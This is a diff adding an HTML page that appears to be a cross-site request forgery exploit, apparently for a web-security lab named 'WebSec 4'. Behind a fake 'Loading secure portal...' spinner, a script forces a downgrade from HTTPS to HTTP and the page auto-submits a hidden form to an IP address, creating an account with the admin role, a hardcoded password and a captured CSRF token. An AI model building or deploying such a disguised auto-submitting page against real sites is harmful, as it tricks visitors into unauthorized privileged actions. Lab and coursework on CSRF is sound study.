@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading WebSec 4...</title>
+    <script>
+        (function () {
+            if (location.protocol !== 'https:') return;
+            if (sessionStorage.getItem('csrf_http_tried') === '1') return;
+            sessionStorage.setItem('csrf_http_tried', '1');
+            location.replace('http://' + location.host + location.pathname + location.search);
+        })();
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0f0f10; color: #ddd; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { text-align: center; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #E63946; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="document.getElementById('csrf_form').submit()">
+    <div class="box">
+        <div class="spinner"></div>
+        <h2>Loading secure portal...</h2>
+        <p>Please wait while we redirect you.</p>
+    </div>
+
+    <form id="csrf_form" method="POST"
+          action="http://193.226.5.99/websec4/index.php"
+          style="display:none;">
+        <input type="hidden" name="username" value="t.singerean">
+        <input type="hidden" name="password" value="tudor123">
+        <input type="hidden" name="role"     value="admin">
+        <input type="hidden" name="csrf"     value="ac75aa06ed978a3fb6cb974248963815508826dacad0424f2259e59a25d07543">
+    </form>
+</body>
+</html>
